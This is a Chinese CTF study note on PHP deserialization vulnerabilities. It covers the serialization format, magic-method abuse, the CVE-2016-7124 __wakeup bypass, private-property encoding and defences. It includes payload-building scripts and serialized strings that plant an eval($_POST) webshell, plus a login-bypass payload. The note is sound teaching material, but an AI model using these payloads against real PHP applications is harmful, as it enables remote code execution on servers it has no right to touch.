---
title: PHP反序列化漏洞
tags: [CTF, Web安全, PHP]
date: 2026-07-05
---

# PHP反序列化漏洞

## 一、基本概念

### 1.1 序列化与反序列化

- **序列化（Serialization）**：把内存中的对象 → 转换为可存储或传输的字符串
- **反序列化（Deserialization）**：把字符串 → 还原为内存中的对象

```php
// 序列化
$str = serialize($object);

// 反序列化
$object = unserialize($str);
```

### 1.2 PHP序列化格式

| 标记 | 含义 | 示例 |
|------|------|------|
| `s` | 字符串 string | `s:5:"hello"` |
| `i` | 整数 integer | `i:42` |
| `b` | 布尔 boolean | `b:1`(true) / `b:0`(false) |
| `a` | 数组 array | `a:1:{i:0;s:3:"hi";}` |
| `O` | 对象 object | `O:11:"ctfshowUser":3:{...}` |
| `N` | null | `N;` |

### 1.3 格式解析示例

```
O:11:"ctfshowUser":3:{s:8:"username";s:5:"xxxxx";s:8:"password";s:5:"xxxxx";s:6:"isVip";b:1;}
```

- `O:11` → 对象，类名长度11
- `"ctfshowUser"` → 类名
- `:3` → 3个属性
- `s:8:"username"` → 字符串属性，长度8
- `b:1` → 布尔值 true

---

## 二、漏洞原理

### 2.1 核心条件

```
反序列化漏洞 = unserialize()接收用户输入 + 可利用的类 + 用户可控序列化内容
```

### 2.2 攻击流程

1. 攻击者构造一个恶意的序列化字符串
2. 通过某种方式（GET/POST/Cookie）传给服务器
3. 服务器 `unserialize()` 还原成对象
4. 对象属性已经是攻击者设定的值，绕过正常逻辑

---

## 三、常见CTF题型

### 3.1 属性篡改（绕过验证）

**目标**：通过反序列化直接设置对象属性，绕过登录验证

```php
class ctfshowUser{
    public $username='xxxxx';
    public $password='xxxxx';
    public $isVip=false;

    public function login($u,$p){
        return $this->username===$u && $this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }
    }
}
```

**Payload构造**：

```php
<?php
class ctfshowUser{
    public $username='xxxxx';
    public $password='xxxxx';
    public $isVip=true;  // 直接设为true
}
$user = new ctfshowUser();
echo urlencode(serialize($user));
// Cookie: user=<输出结果>
// URL: ?u=xxxxx&p=xxxxx
?>
```

### 3.2 魔术方法利用

PHP中自动触发的魔术方法：

| 魔术方法 | 触发时机 |
|---------|---------|
| `__construct()` | 对象创建时（new） |
| `__destruct()` | 对象销毁时 |
| `__wakeup()` | 反序列化完成时 |
| `__toString()` | 对象被当字符串使用时 |
| `__call()` | 调用不存在的方法时 |

**危险场景**：类中存在 `__destruct()` 或 `__wakeup()` 且包含危险操作

```php
class test{
    public $name;
    public function __destruct(){
        file_put_contents("shell.php", $this->name);  // 写文件
    }
}

// 攻击者构造：
// O:4:"test":1:{s:4:"name";s:31:"<?php eval($_POST['cmd']); ?>";}
// → 对象销毁时自动写入webshell
```

### 3.3 绕过 `__wakeup()`（CVE-2016-7124）

**适用版本**：PHP < 5.6.25 或 PHP 7.x < 7.0.10

**原理**：如果序列化字符串中声明的属性数量 > 类实际属性数量，`__wakeup()` 会被跳过

```php
class test{
    public $name = "fairy";  // 只有1个属性

    public function __wakeup(){
        foreach(get_object_vars($this) as $k => $v){
            $this->$k = null;  // 清空所有属性
        }
    }
    public function __destruct(){
        $fp = fopen("0day.php","w");
        fputs($fp, $this->name);  // 写入文件
        fclose($fp);
    }
}
```

**正常序列化**（会触发 `__wakeup`）：
```
O:4:"test":1:{s:4:"name";s:34:"<?php eval($_POST["cmd"]); ?>";}
```

**绕过**（属性数量1改为2）：
```
O:4:"test":2:{s:4:"name";s:34:"<?php eval($_POST["cmd"]); ?>";}
```

**Payload构造**：

```php
<?php
class test{
    public $name = '<?php eval($_POST["cmd"]); ?>';
}
$user = new test();
$s = serialize($user);
$s = str_replace(':1:', ':2:', $s);  // 绕过__wakeup
echo urlencode($s);
?>
```

---

## 四、传入方式

反序列化入口可能在不同的超全局变量中：

| 传入方式 | 对应变量 | 常见参数名 |
|---------|---------|-----------|
| URL参数 | `$_GET` | `?data=...` |
| POST数据 | `$_POST` | 表单提交 |
| Cookie | `$_COOKIE` | `Cookie: user=...` |
| HTTP头 | `$_SERVER` / `getallheaders()` | 自定义头 |

**注意**：Cookie中的特殊字符（如双引号）可能需要URL编码，PHP的 `$_COOKIE` 会自动解码。

---

## 五、防御方式

1. **不要对用户输入使用 `unserialize()`**，用 `json_decode()` 代替
2. 如果必须使用，限制可反序列化的类：
   ```php
   unserialize($data, ['allowed_classes' => false]); // 禁止自动创建对象
   ```
3. 对输入数据做严格的校验和过滤
4. 升级PHP版本，修补已知漏洞（如CVE-2016-7124）

---

## 六、解题思路总结

```
1. 审计源码，找到 unserialize() 入口
2. 确定入口位置（GET/POST/Cookie）
3. 分析类的属性和方法，找到可利用的点：
   - 属性篡改（isVip、password等）
   - 魔术方法（__destruct、__wakeup等）
4. 构造序列化payload
5. 注意绕过技巧（属性数量篡改等）
6. 通过正确的方式传入payload
```

---

## 实战：私有属性 + __wakeup 绕过（完整题解）

> 题目：DASCTF「I have a cat!」，flag `CTF2{ce0c7724-5671-4b25-ae52-ab942a579230}`
> 完整 writeup（逐层实测对照表、回显现形位置、命令行传 NUL 的正确姿势）见 `Web安全-PHP反序列化wakeup绕过WriteUp.md`

### 三条规则补在这里

1. `private` 属性的序列化键名是 `\x00类名\x00属性名`（两端不可见，字节 `0x00`），长度**按字节**算。
   `\x00Name\x00username` = 1+4+1+8 = **14**；写成 `s:8:"username"` 不报错，但赋值落空，类的真实属性保持默认值。
2. 绕过 `__wakeup` 保护的是 `__destruct` 的条件：`unserialize()` 内部是**先填属性 → 再调 `__wakeup()`**，而 `__destruct()` 在脚本结束、对象释放时才跑，中间没有别的钩子会再改属性。
   所以只要 `__wakeup` 被跳过，我们塞进去的值就原样活到析构。
3. 判据是「声明的属性个数 vs **payload 里实际给了几个成员**」：
   - 声明 > 实际 → `__wakeup` 被跳过，属性照常赋值 ✅
   - 声明 < 实际 → **整体解析失败**，所有属性退回类默认值（不是"部分赋值"）
   - 声明 = 实际 → 正常解析，`__wakeup` 执行

### 单字段判据（最快的验证手法）

思路是**只塞会暴露 `__wakeup` 是否执行的那个字段**：给 `username=admin` 而不给 `password`，看回显的 `You name is: X`。

| 声明个数 | 回显 | 结论 |
|---|---|---|
| 1 | `You name is: guest` | `__wakeup` 执行了 |
| 2 / 3 | `You name is: admin` | `__wakeup` 被跳过 ✅ |

### 一个反直觉点

`__destruct` 里的 `echo` 输出排在整份 HTML 的 `</html>` **之后**。定位回显时若只截页面中间那段 PHP 标签区域，会误判成"解析失败、没有任何输出"——**永远拿整个响应搜关键字**。
